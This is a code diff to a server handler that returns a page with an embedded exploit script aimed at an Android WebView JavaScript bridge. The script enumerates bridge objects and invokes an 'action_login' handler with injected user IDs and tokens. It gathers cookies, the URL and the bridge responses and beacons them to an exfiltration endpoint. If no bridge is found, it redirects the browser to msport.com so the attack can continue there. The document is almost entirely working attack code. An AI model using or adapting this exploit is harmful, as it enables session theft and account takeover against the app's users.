@@ -58,113 +58,86 @@ module.exports = async function handler(req, res) {
     try { (new Image()).src = EXFIL + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0,1800)) + '&_=' + Date.now(); } catch(e){}
   }
 
-  // The bridge may be injected after page load by MWebViewActivity.
-  // Poll for up to 10 seconds.
   var attempts = 0;
   var maxAttempts = 20;
+  var bridgeFound = false;
 
   function tryBridge() {
     attempts++;
-    var result = {
-      ts: new Date().toISOString(),
-      url: location.href,
-      origin: location.origin,
-      cookie: document.cookie,
-      cookie_len: document.cookie.length,
-      attempt: attempts,
-      bridges_found: {},
-      action_login_result: null,
-      errors: []
-    };
-
-    // Check for bridge objects
+    var found = [];
     var names = ['WebViewJavascriptBridge','WebviewJsBridge','action_login',
       'AndroidBridge','Android','jsBridge','JsBridge','JSBridge','nativeBridge',
       'bridge','webviewBridge','WebViewBridge','__native__','__bridge__'];
 
     names.forEach(function(n) {
-      try {
-        if (window[n]) {
-          result.bridges_found[n] = typeof window[n];
-        }
-      } catch(e){}
+      try { if (window[n]) found.push(n); } catch(e){}
     });
 
-    // Try calling action_login via any discovered bridge
-    names.forEach(function(n) {
-      try {
+    if (found.length > 0) {
+      bridgeFound = true;
+      L('bridge found', found.join(','));
+      var result = {
+        ts: new Date().toISOString(),
+        url: location.href,
+        origin: location.origin,
+        cookie: document.cookie,
+        cookie_len: document.cookie.length,
+        bridges: found,
+        action_login_result: null
+      };
+
+      found.forEach(function(n) {
         var b = window[n];
-        if (b && typeof b.callHandler === 'function') {
-          b.callHandler('action_login', JSON.stringify({
-            userId: 'PROBE_USER_ID',
-            accessToken: 'PROBE_ACCESS_TOKEN',
-            refreshToken: 'PROBE_REFRESH_TOKEN'
-          }), function(resp) {
-            result.action_login_result = 'callback:' + JSON.stringify(resp);
-            exfil(result);
-          });
-          result.action_login_result = 'callHandler_sent';
-          return;
-        }
-        if (b && typeof b.postMessage === 'function') {
-          b.postMessage(JSON.stringify({
-            userId: 'PROBE_USER_ID',
-            accessToken: 'PROBE_ACCESS_TOKEN',
-            refreshToken: 'PROBE_REFRESH_TOKEN'
-          }));
-          result.action_login_result = 'postMessage_sent';
-          return;
-        }
-        if (b && typeof b === 'object') {
-          // Try direct method call
-          ['call','send','invoke','exec'].forEach(function(m) {
-            if (typeof b[m] === 'function') {
-              try {
-                b[m]('action_login', JSON.stringify({
-                  userId: 'PROBE_USER_ID',
-                  accessToken: 'PROBE_ACCESS_TOKEN',
-                  refreshToken: 'PROBE_REFRESH_TOKEN'
-                }));
-                result.action_login_result = m + '_sent';
-              } catch(e) {
-                result.errors.push(n+'.'+m+':'+e);
-              }
-            }
-          });
-        }
-      } catch(e) {
-        result.errors.push(n+':'+e);
-      }
-    });
+        if (!b) return;
+        var methods = ['callHandler','postMessage','call','send','invoke','exec'];
+        methods.forEach(function(m) {
+          if (typeof b[m] !== 'function') return;
+          try {
+            b[m]('action_login', JSON.stringify({
+              userId: 'PROBE_USER_ID',
+              accessToken: 'PROBE_AT',
+              refreshToken: 'PROBE_RT'
+            }), function(resp) {
+              result.action_login_result = n+'.'+m+' callback:' + JSON.stringify(resp);
+              exfil(result);
+            });
+            result.action_login_result = n+'.'+m+' sent';
+            return;
+          } catch(e) {
+            result.action_login_result = n+'.'+m+' err:'+e;
+          }
+        });
+      });
 
-    // Also try the lzyzsd/jsbridge URL scheme
-    try {
-      var iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = 'wvjb://__bridge_ready__';
-      document.body.appendChild(iframe);
-      setTimeout(function(){ iframe.remove(); }, 500);
-      result.bridges_found['wvjb_scheme'] = 'sent';
-    } catch(e) {
-      result.errors.push('wvjb:'+e);
-    }
-
-    if (attempts >= maxAttempts || Object.keys(result.bridges_found).length > 0) {
-      L('done', 'attempt ' + attempts + ' bridges: ' + Object.keys(result.bridges_found).join(','));
       exfil(result);
       return;
     }
 
-    L('polling', attempt + '/' + maxAttempts + ' bridges: none yet');
+    if (attempts >= maxAttempts) {
+      L('no bridge after', maxAttempts + ' attempts');
+      var finalResult = {
+        ts: new Date().toISOString(),
+        url: location.href,
+        origin: location.origin,
+        cookie: document.cookie,
+        cookie_len: document.cookie.length,
+        bridges: [],
+        action_login_result: 'no_bridge_on_external_page',
+        note: 'Bridge not injected into external pages. Redirecting to msport.com where bridge IS available.'
+      };
+      exfil(finalResult);
+      L('redirecting', 'to msport.com');
+      window.location.replace('https://www.msport.com/');
+      return;
+    }
+
+    L('polling', attempts + '/' + maxAttempts);
     setTimeout(tryBridge, 500);
   }
 
-  // Start polling
-  tryBridge();
-
-  // Also try reading cookies directly (will be empty cross-origin but confirms)
   L('origin', location.origin);
   L('cookie_len', document.cookie.length);
+  tryBridge();
 })();
 </script></body></html>`;
 
